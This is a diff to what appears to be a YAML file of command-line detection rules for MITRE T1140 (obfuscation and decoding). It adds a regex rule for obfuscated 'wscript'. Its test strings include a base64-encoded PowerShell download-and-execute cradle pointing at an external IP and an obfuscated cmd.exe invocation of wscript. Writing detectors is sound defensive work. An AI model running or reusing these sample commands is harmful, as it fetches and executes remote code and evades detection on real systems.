@@ -67,3 +67,11 @@ keys:
     technique: T1140
     risk: Medium
     test: "powershell decode from base64 IiRoamY9TmV3LU9ia/mVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudDskaG+pmLlByb3h5PVtTeXN0ZW0uTl5ldC5XZWJSZXF1ZXN0XTo6R2V0U3lzdGVtV2ViUHJveHkoKTskaGpmLlByb3h5LkNyZWRlbnRpYWxzPVtTeXN0ZW0uTl5ldC5DcmVkZW50aWFsQ2FjaGVdOjpEZWZhdWx0Q3JlZGVudGlhbHM7JGhqZi5IZWFkZXJzLkFkZCgnVXNlci1BZ2VudCcsJ00vNS4xOCcpOyRyPSRoamYuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly8xOTMuMTA5LjY5LjUvZ2dnbS91cGwvdHh0Jyk7SUVYICRyIg=="
+  10:
+    command: 'w[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}s[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}c[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}r[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}i[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}p[%@!?;:\[\]\{\}=+-_$#\^&*()`~<>]{0,15}t'
+    name: Commandline containing obfuscated wscript
+    description: Attackers often abuse cmd-line obfuscation/encoding to avoid static detections.
+    tactic: Defense Evasion
+    technique: T1140
+    risk: High
+    test: 'C:\afoabngf\aogfbn\cmd.exe /c set x=w@sc@r@i@pt /e:j@sc@rip@t .. echo %x:@=%|cmd'
